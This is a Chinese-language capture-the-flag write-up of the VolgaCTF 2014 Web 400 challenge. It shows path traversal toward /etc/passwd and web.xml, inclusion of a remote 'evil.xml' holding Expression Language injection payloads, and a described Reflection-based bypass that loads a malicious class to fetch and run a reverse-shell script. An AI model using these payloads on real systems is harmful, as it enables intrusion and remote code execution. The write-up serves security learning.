---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/
title: "Volga CTF 2014 Web 400 write up | Orange Tsai"
author: "Orange Tsai"
published: 2014-03-29T16:00:00.000Z
description: "回到家看到 CRAX Team 在玩 VolgaCTF 就順手玩了一下! 解這題的時候順便讓我練習到了之前就想好好惡補一下的 EL 注入（Expression Language Injection） ，最後花了滿多時間再用 Java 的 Reflection API 來找到可利用的地方，網址點開為一個類似 Twitter 的個人留言板服務 註冊登入後長得如下，共有新增留言、設定、個人首頁、登出的"
---

* * *

回到家看到 CRAX Team 在玩 VolgaCTF 就順手玩了一下!

解這題的時候順便讓我練習到了之前就想好好惡補一下的 EL 注入（Expression Language Injection） ，最後花了滿多時間再用 Java 的 Reflection API 來找到可利用的地方，網址點開為一個類似 Twitter 的個人留言板服務

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/917cacd6c892c866-01.png)

註冊登入後長得如下，共有新增留言、設定、個人首頁、登出的功能

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/73cd3470ddfb60e0-02.png)

接下來就是開始找尋漏洞的時候，找的方法不外乎那些XD 最後是發現在設定的地方有個可以讓使用者自行指定布景 （header）的功能

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/6b0cc568c9a4a83b-03.png)

使用 Tamper Data 對我們送出的資訊進行截取:

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/672cc0742c7e56bd-04.png)

可以發現，送出的資料中 header 的部分是一個檔案路徑的形式存在

> ./headers/bar.xhtml

網站透過這個功能去引用自己的 template 以達到使用者自定布景主題的效果，因此我們來試試看，將 header 設為 `../../../../../etc/passwd` 看會出現什麼事情？

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/9bc81385a8fc7ac4-05.png)

網站死掉了…

任何功能都無法操作，只能把 Cookie 清空再註冊一個帳號嘗試，之後的步驟都是這樣，只要一個地方出錯就要重新註冊一個帳號重來一次XD

這點滿麻煩的，不過多少達到讓駭客覺得麻煩防駭客的效果XD

不過從錯誤資訊可以看到，網站使用了 `<ui:include src="...">` 的方式引入檔案，所以透過這個功能我們可以引入伺服器上的任意檔案（但是只限定於 html, xml 格式，不然再處理時會出錯一樣無法看到檔案內容）

雖然有格式限制，但我們可以嘗試引入網站 Java Servlet 的設定檔 `WEB-INF/web.xml` 來讀取一些設定

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/3b21f915cb4c40eb-06.png)

現在已經定位了漏洞的地方了，接下來是如何的利用？

發現，在引入的時候不只可以引入本地檔案，也可以利用 [http://yourhome/foo.xml](http://yourhome/foo.xml) 的方式引入外部 html 或者 xml，但是只是引入 html 或者 xml 有什麼用呢？

在許多 Java Servlet 裏面（如 Struts, Spring Framework GlassFish etc…）我們可以使用一種叫做 EL 的語言，EL 本意是用來降低後端程式跟前端的困擾，讓兩者出來的程式可以更快速地結合

使用的方式是使用 `${...EL...}` 這樣的方式執行，所以我們將 header 設為自己伺服器上的檔案 `http://yourhome.com/evil.xml`，並將 evil.xml 內容設定為

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br><f:view xmlns:f="http://java.sun.com/jsf/core" xmlns:h="http://java.sun.com/jsf/html" ><br>    <h:inputText id="userName" value='${300*1+1}'/><br></f:view><br>``` |

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/c991be5c081e46ed-07.png)

可以看到 `300*1+1` 有確實的被執行到變成 `301` 惹，再用 applicationScope 查看一下伺服器設定:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br><f:view xmlns:f="http://java.sun.com/jsf/core" xmlns:h="http://java.sun.com/jsf/html" ><br>    <h:inputText id="userName" value='${applicationScope}'/><br></f:view><br>``` |

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/8b059e226fd3fd3a-08.png)

可以查看一些敏感資訊，最後是執行指令的部分。 EL 有對於一些危險指令做了一些限制，不過這些限制是可以繞過，相關 paper 可以參考 [Remote Code with Expression Language Injection](https://www.aspectsecurity.com/uploads/downloads/2012/12/Remote-Code-with-Expression-Language-Injection.pdf)

內文中使用 [Java Reflection API](http://docs.oracle.com/javase/tutorial/reflect/) 的方式拿到 URLClassLoader 去讀取自己所寫好惡意的Java class 檔案，但是伺服器上的環境似乎跟 Paper 不太相同，所以不能直接使用上面的攻擊代碼，必須小改一下!

伺服器上似乎沒有 pageContext 這個全域變數，所以無法透過它去取得 ServletContext 的 class，所以那時候就在慢慢踹，對其他已知的全域變數用 Relfection API 想辦法拿到ServletContext 這個 class

最後發現可以改用 session.getServletContext()，因此改寫上面的攻擊代碼成:

`Malicious.class` 要放上你要執行的 Java 程式，我這裡放的是從自己的 server 上下載反連的 perl script，並且執行

結果如下

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/73f39b0d2d7cb158-09.png)

![](https://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/2300cc88e646b421-10.png)

> FLAG W0W\_S0\_J@V@\_SUCH\_EL\_V3RY\_RCE